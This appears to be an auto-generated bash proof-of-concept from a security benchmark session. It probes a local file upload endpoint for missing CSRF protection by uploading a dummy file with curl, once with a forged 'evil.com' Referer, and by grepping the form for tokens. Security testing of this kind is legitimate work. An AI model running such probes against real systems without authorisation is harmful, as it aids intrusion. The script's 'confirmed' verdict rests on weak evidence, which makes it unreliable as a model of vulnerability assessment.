#!/bin/bash
# POC: Demonstrates CSRF vulnerability on file upload endpoint by uploading a file with a spoofed Referer header and confirming no CSRF tokens are used
# Target: ./repo
# Created: 2025-11-07T17:11:55.809Z
# Session: benchmark-XBEN-067-24-mhp3pdwz

# CSRF Vulnerability POC - File Upload Endpoint
# This script demonstrates that the file upload endpoint lacks CSRF protection
# by successfully uploading a file with a spoofed Referer header

TARGET_URL="http://localhost:8080/"
TEST_FILE="/tmp/csrf_test_file_$RANDOM.jpg"
ATTACK_REFERER="http://evil.com"

echo "[*] CSRF File Upload Vulnerability POC"
echo "[*] Target: $TARGET_URL"
echo ""

# Create a test file to upload
echo "Creating test file..."
echo "fake image data" > "$TEST_FILE"

# Attempt 1: Normal upload (baseline)
echo "[+] Attempt 1: Normal upload without spoofed Referer"
RESPONSE_1=$(curl -s -w "\n%{http_code}" -F "userfile=@$TEST_FILE" "$TARGET_URL")
HTTP_CODE_1=$(echo "$RESPONSE_1" | tail -n1)
BODY_1=$(echo "$RESPONSE_1" | head -n-1)
echo "HTTP Status: $HTTP_CODE_1"
echo ""

# Attempt 2: Upload with spoofed Referer (CSRF attack simulation)
echo "[+] Attempt 2: Upload with spoofed Referer header (simulating CSRF attack)"
RESPONSE_2=$(curl -s -w "\n%{http_code}" -F "userfile=@$TEST_FILE" "$TARGET_URL" -H "Referer: $ATTACK_REFERER")
HTTP_CODE_2=$(echo "$RESPONSE_2" | tail -n1)
BODY_2=$(echo "$RESPONSE_2" | head -n-1)
echo "HTTP Status: $HTTP_CODE_2"
echo ""

# Determine if vulnerability is confirmed
VULN_CONFIRMED=0

# Analysis
echo "[*] CSRF Protection Analysis:"
echo "[*] Both requests returned: $HTTP_CODE_1 and $HTTP_CODE_2"

# Success criteria: Both requests succeed (indicating no CSRF protection)
if [ "$HTTP_CODE_1" = "200" ] && [ "$HTTP_CODE_2" = "200" ]; then
    echo "[!] VULNERABLE: File upload succeeded with AND without spoofed Referer"
    echo "[!] The application does not validate request origin"
    VULN_CONFIRMED=1
fi

# Attempt 3: Check for CSRF token in the HTML form
echo ""
echo "[+] Attempt 3: Checking HTML form for CSRF token"
FORM_HTML=$(curl -s "$TARGET_URL")

# Check if form has action, file input, and submit button (basic form structure)
if echo "$FORM_HTML" | grep -q "form\|input.*file\|submit"; then
    # Check for CSRF token presence
    if echo "$FORM_HTML" | grep -qiE "csrf|token|nonce|_token"; then
        echo "[-] Form contains CSRF token/nonce references"
    else
        echo "[!] Form does NOT contain any CSRF token or nonce"
        echo "[!] No CSRF protection mechanisms detected"
        VULN_CONFIRMED=1
    fi
fi

# Cleanup
rm -f "$TEST_FILE"

echo ""
echo "[*] POC Complete"
if [ "$VULN_CONFIRMED" = "1" ]; then
    echo "[+] CSRF Vulnerability CONFIRMED"
    echo "[+] Evidence: File upload succeeded regardless of origin validation"
    echo "[+] No CSRF tokens or origin validation present"
    exit 0
else
    echo "[-] Could not confirm vulnerability"
    exit 1
fi